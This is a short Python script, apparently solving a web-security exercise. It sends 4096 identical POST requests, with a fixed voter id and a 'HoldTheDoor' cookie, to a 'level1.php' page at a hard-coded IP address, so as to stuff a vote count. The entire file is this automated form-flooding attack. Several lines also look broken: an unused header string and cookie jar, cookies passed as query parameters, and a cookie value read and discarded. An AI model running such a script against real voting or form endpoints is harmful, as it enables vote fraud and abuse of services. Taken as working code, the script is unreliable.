#!/usr/bin/python
import requests

URL = 'http://54.221.6.249/level1.php/cookies'
header = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp'
payload = {'id': '128', 'holdthedoor': 'Submit', 'key': '0'}

cookies = {'HoldTheDoor': '0'}
r = requests.get(URL, cookies)
jar = requests.cookies.RequestsCookieJar()

r.cookies['HoldTheDoor']

for i in range(4096):
    r = requests.post(URL, data=payload, cookies=cookies)
